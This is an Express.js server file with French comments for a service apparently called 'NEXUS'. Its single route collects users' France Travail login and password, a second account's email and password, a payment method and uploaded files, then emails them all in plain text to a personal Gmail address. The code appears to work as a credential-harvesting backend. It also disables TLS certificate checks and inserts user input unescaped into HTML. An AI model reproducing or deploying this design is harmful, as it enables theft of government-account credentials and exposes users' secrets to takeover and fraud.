import express from 'express';
import nodemailer from 'nodemailer';
import multer from 'multer';
import cors from 'cors';

const app = express();

// Configuration du CORS pour accepter votre Frontend Render
app.use(cors({
  origin: 'https://nexus-ob.onrender.com'
}));

app.use(express.json());

const upload = multer({ storage: multer.memoryStorage() });

// Route principale de soumission
app.post('/api/send-order', upload.any(), async (req, res) => {
  try {
    const { 
      pack, 
      identifiantFT, 
      passwordFT, 
      emailDedicace, 
      passwordDedicace, 
      methodePaiement 
    } = req.body;
    
    const files = req.files || [];

    // Validation minimale pour éviter que nodemailer ne crash si les variables d'environnement manquent
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
      console.error("❌ ERREUR CRITIQUE : Les variables EMAIL_USER ou EMAIL_PASS ne sont pas configurées sur Render.");
      return res.status(500).json({ success: false, message: "Configuration email manquante sur le serveur." });
    }

    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 587,
      secure: false, // Port 587 utilise STARTTLS
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS, 
      },
      tls: {
        rejectUnauthorized: false 
      }
    });

    // Transformation des fichiers reçus en pièces jointes
    const attachments = files.map(file => ({
      filename: file.originalname,
      content: file.buffer
    }));

    await transporter.sendMail({
      from: '"NEXUS System" <andregomis3954@gmail.com>',
      to: 'andregomis3954@gmail.com',
      subject: `🚀 DOSSIER RÉCEPTIONNÉ : ${pack || 'Non défini'}`,
      html: `
        <div style="font-family: sans-serif; line-height: 1.6; color: #333; padding: 20px; border: 2px solid #059669; border-radius: 15px;">
          <h2 style="color: #059669;">Nouveau Dossier Reçu - NEXUS</h2>
          <p><strong>Type de pack :</strong> ${pack || 'Non défini'}</p>
          
          <div style="background: #f4f4f4; padding: 15px; border-radius: 10px; margin: 20px 0;">
            <h3 style="margin-top: 0; color: #0284c7;">🔑 Accès France Travail</h3>
            <p><strong>Identifiant :</strong> ${identifiantFT || 'Non fourni'}</p>
            <p><strong>Mot de passe :</strong> ${passwordFT || 'Non fourni'}</p>
          </div>

          <div style="background: #f4f4f4; padding: 15px; border-radius: 10px; margin: 20px 0;">
            <h3 style="margin-top: 0; color: #059669;">📧 Espace Candidat Dédié</h3>
            <p><strong>Email :</strong> ${emailDedicace || 'Non fourni'}</p>
            <p><strong>Mot de passe :</strong> ${passwordDedicace || 'Non fourni'}</p>
          </div>

          <p><strong>Méthode de Paiement :</strong> ${methodePaiement || 'Virement Bancaire / Capture écran'}</p>
          <p style="font-size: 12px; color: #666;">Fichiers joints : ${attachments.length}</p>
        </div>
      `,
      attachments
    });

    console.log("✅ Mail envoyé avec succès !");
    return res.status(200).json({ success: true, message: "Dossier transmis avec succès." });
  } catch (error) {
    console.error("❌ Erreur lors du traitement ou de l'envoi du mail :", error);
    return res.status(500).json({ success: false, message: error.message || "Erreur interne du serveur." });
  }
});

// IMPORTANT POUR RENDER : Écouter sur 0.0.0.0 et récupérer la variable PORT globale
const PORT = process.env.PORT || 3001;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Serveur NEXUS actif sur le port ${PORT}`);
});